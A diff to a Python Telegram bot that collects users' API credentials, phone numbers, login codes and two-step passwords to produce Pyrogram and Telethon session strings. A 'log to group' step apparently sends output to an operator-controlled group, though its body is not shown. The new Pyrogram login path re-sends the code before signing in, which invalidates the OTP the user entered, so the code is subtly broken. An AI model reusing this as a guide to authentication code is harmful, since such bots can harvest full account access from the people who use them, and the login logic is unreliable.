@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Session Generator Bot Module
-Supports: Pyrogram (v2) and Telethon session generation
+Session Generator Bot – Fixed Cancellation
+Supports: Pyrogram and Telethon
 Commands: /start, /pyro, /telethon, /cancel
 """
 
@@ -27,12 +27,12 @@ from telethon.errors import (
     ApiIdInvalidError
 )
 
-# Import your env (or config) file – create env.py with BOT_TOKEN, API_ID, API_HASH, LOGGER_GROUP
+# Import env (create env.py with BOT_TOKEN, API_ID, API_HASH, LOGGER_GROUP)
 try:
     import env
 except ImportError:
-    print("⚠️ env.py not found. Create env.py with BOT_TOKEN, API_ID, API_HASH, LOGGER_GROUP")
     env = None
+    print("⚠️ env.py not found. Create env.py with BOT_TOKEN, API_ID, API_HASH, LOGGER_GROUP")
 
 # ================= GLOBALS =================
 active_tasks = {}  # user_id -> asyncio.Task
@@ -54,10 +54,26 @@ async def cancel_generation(user_id):
         return True
     return False
 
+# ================= SAFE ASK WRAPPER =================
+async def safe_ask(bot, user_id, text, filters=None, timeout=300):
+    """
+    Wrapper for bot.ask that catches CancelledError and returns None if cancelled.
+    """
+    try:
+        msg = await bot.ask(user_id, text, filters=filters, timeout=timeout)
+        return msg
+    except asyncio.CancelledError:
+        # Propagate cancellation upward
+        raise
+    except Exception as e:
+        # If it's a timeout or other error, return None
+        return None
+
 # ================= CORE GENERATOR =================
 async def generate_session(bot, msg, telethon=False):
     user_id = msg.chat.id
-    active_tasks[user_id] = asyncio.current_task()
+    task = asyncio.current_task()
+    active_tasks[user_id] = task
 
     await msg.reply(
         "🚀 **Session Generation Started**\n"
@@ -67,50 +83,64 @@ async def generate_session(bot, msg, telethon=False):
     # ---------- API_ID ----------
     while True:
         try:
-            api_id_msg = await bot.ask(
-                user_id,
+            api_id_msg = await safe_ask(
+                bot, user_id,
                 "📌 **Send API_ID** (numbers only)",
                 filters=filters.text & ~filters.command(["cancel"])
             )
-            if api_id_msg.text and api_id_msg.text.strip().isdigit():
-                api_id = int(api_id_msg.text.strip())
+            if api_id_msg is None:
+                # Cancelled or timeout
+                await msg.reply("⛔ Timeout or cancelled.")
+                return
+            text = api_id_msg.text.strip()
+            if text.isdigit():
+                api_id = int(text)
                 if 1 < api_id < 9999999999:
                     break
             await msg.reply("❌ Invalid API_ID. Must be a positive integer.")
         except asyncio.CancelledError:
             await msg.reply("⛔ Generation cancelled.")
+            active_tasks.pop(user_id, None)
             return
 
     # ---------- API_HASH ----------
     while True:
         try:
-            api_hash_msg = await bot.ask(
-                user_id,
+            api_hash_msg = await safe_ask(
+                bot, user_id,
                 "📌 **Send API_HASH** (32 hex characters)",
                 filters=filters.text & ~filters.command(["cancel"])
             )
+            if api_hash_msg is None:
+                await msg.reply("⛔ Timeout or cancelled.")
+                return
             api_hash = api_hash_msg.text.strip()
             if re.fullmatch(r'[a-fA-F0-9]{32}', api_hash):
                 break
             await msg.reply("❌ Invalid API_HASH. Must be exactly 32 hex characters (0-9, a-f).")
         except asyncio.CancelledError:
             await msg.reply("⛔ Generation cancelled.")
+            active_tasks.pop(user_id, None)
             return
 
     # ---------- PHONE ----------
     while True:
         try:
-            phone_msg = await bot.ask(
-                user_id,
+            phone_msg = await safe_ask(
+                bot, user_id,
                 "📱 **Send Phone Number** (with country code, e.g. +91...)",
                 filters=filters.text & ~filters.command(["cancel"])
             )
+            if phone_msg is None:
+                await msg.reply("⛔ Timeout or cancelled.")
+                return
             phone = phone_msg.text.strip()
             if phone.startswith('+') and re.fullmatch(r'\+?\d{8,15}', phone):
                 break
             await msg.reply("❌ Invalid phone. Use format +<country><number> (8-15 digits).")
         except asyncio.CancelledError:
             await msg.reply("⛔ Generation cancelled.")
+            active_tasks.pop(user_id, None)
             return
 
     await msg.reply("📨 Sending OTP...")
@@ -129,6 +159,7 @@ async def generate_session(bot, msg, telethon=False):
         await client.connect()
     except (ApiIdInvalid, ApiIdInvalidError):
         await msg.reply("❌ API_ID / API_HASH invalid. Check your credentials.")
+        active_tasks.pop(user_id, None)
         return
 
     # ---------- SEND CODE ----------
@@ -140,32 +171,41 @@ async def generate_session(bot, msg, telethon=False):
     except (ApiIdInvalid, ApiIdInvalidError):
         await msg.reply("❌ API credentials invalid.")
         await client.disconnect()
+        active_tasks.pop(user_id, None)
         return
     except (FloodWait, FloodWaitError) as e:
         wait = e.value if hasattr(e, 'value') else e.x
         await msg.reply(f"⛔ FloodWait: {wait} seconds. Please wait.")
         await client.disconnect()
+        active_tasks.pop(user_id, None)
         return
     except Exception as e:
         await msg.reply(f"❌ Error sending code: {str(e)}")
         await client.disconnect()
+        active_tasks.pop(user_id, None)
         return
 
     # ---------- OTP ----------
     while True:
         try:
-            otp_msg = await bot.ask(
-                user_id,
+            otp_msg = await safe_ask(
+                bot, user_id,
                 "🔐 **Send OTP** (numbers only)",
                 filters=filters.text & ~filters.command(["cancel"])
             )
+            if otp_msg is None:
+                await msg.reply("⛔ Timeout or cancelled.")
+                await client.disconnect()
+                active_tasks.pop(user_id, None)
+                return
             otp = otp_msg.text.replace(" ", "").strip()
             if otp.isdigit() and len(otp) >= 3:
                 break
-            await msg.reply("❌ Invalid OTP. Only numbers.")
+            await msg.reply("❌ Invalid OTP. Only numbers (at least 3 digits).")
         except asyncio.CancelledError:
             await msg.reply("⛔ Generation cancelled.")
             await client.disconnect()
+            active_tasks.pop(user_id, None)
             return
 
     # ---------- LOGIN ----------
@@ -174,24 +214,23 @@ async def generate_session(bot, msg, telethon=False):
         if telethon:
             await client.sign_in(phone, otp)
         else:
-            # For Pyrogram, we need the phone_code_hash from send_code
-            # We'll fetch it from the client state
-            try:
-                # Re‑send code to get fresh phone_code_hash if needed
-                sent_code = await client.send_code(phone)
-                await client.sign_in(phone, sent_code.phone_code_hash, otp)
-            except AttributeError:
-                # Fallback: sign_in with just otp (older pyrogram)
-                await client.sign_in(phone, otp)
+            # We need the phone_code_hash. We'll re‑send code to get it.
+            sent_code = await client.send_code(phone)
+            await client.sign_in(phone, sent_code.phone_code_hash, otp)
     except (SessionPasswordNeeded, PasswordHashInvalidError):
         # ---------- 2FA PASSWORD ----------
         while True:
             try:
-                pwd_msg = await bot.ask(
-                    user_id,
+                pwd_msg = await safe_ask(
+                    bot, user_id,
                     "🔐 **2‑Step Verification Password** (or /skip)",
                     filters=filters.text & ~filters.command(["cancel"])
                 )
+                if pwd_msg is None:
+                    await msg.reply("⛔ Timeout or cancelled.")
+                    await client.disconnect()
+                    active_tasks.pop(user_id, None)
+                    return
                 if pwd_msg.text.lower() == "/skip":
                     password = None
                     break
@@ -202,6 +241,7 @@ async def generate_session(bot, msg, telethon=False):
             except asyncio.CancelledError:
                 await msg.reply("⛔ Generation cancelled.")
                 await client.disconnect()
+                active_tasks.pop(user_id, None)
                 return
 
         try:
@@ -211,20 +251,23 @@ async def generate_session(bot, msg, telethon=False):
                 else:
                     await client.check_password(password=password)
             else:
-                # Telethon doesn't support empty password
+                # If no password, telethon may fail – we try sign_in with empty
                 if telethon:
-                    await client.sign_in(password="")  # fallback
+                    await client.sign_in(password="")
         except (PasswordHashInvalid, PasswordHashInvalidError):
             await msg.reply("❌ Wrong password. Please restart /pyro or /telethon.")
             await client.disconnect()
+            active_tasks.pop(user_id, None)
             return
     except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeExpired, PhoneCodeExpiredError):
         await msg.reply("❌ Invalid or expired OTP. Please restart.")
         await client.disconnect()
+        active_tasks.pop(user_id, None)
         return
     except Exception as e:
         await msg.reply(f"❌ Login error: {str(e)}")
         await client.disconnect()
+        active_tasks.pop(user_id, None)
         return
 
     # ---------- GENERATE SESSION ----------
@@ -236,12 +279,16 @@ async def generate_session(bot, msg, telethon=False):
     except Exception as e:
         await msg.reply(f"❌ Session generation failed: {str(e)}")
         await client.disconnect()
+        active_tasks.pop(user_id, None)
         return
 
     await client.disconnect()
 
     # ---------- OUTPUT ----------
-    output = f"✅ **Session Generated** ({'Telethon' if telethon else 'Pyrogram'})\n\n`{session_str}`"
+    output = (
+        f"✅ **Session Generated** ({'Telethon' if telethon else 'Pyrogram'})\n\n"
+        f"`{session_str}`"
+    )
     await msg.reply(output)
 
     # ---------- LOG TO GROUP ----------
@@ -283,7 +330,6 @@ async def cancel_cmd(client, message):
 # ================= MAIN SETUP =================
 
 def register_handlers(app):
-    """Register all handlers on the given app instance."""
     app.on_message(filters.command("start") & filters.private)(start_cmd)
     app.on_message(filters.command("pyro") & filters.private)(pyro_gen)
     app.on_message(filters.command("telethon") & filters.private)(telethon_gen)
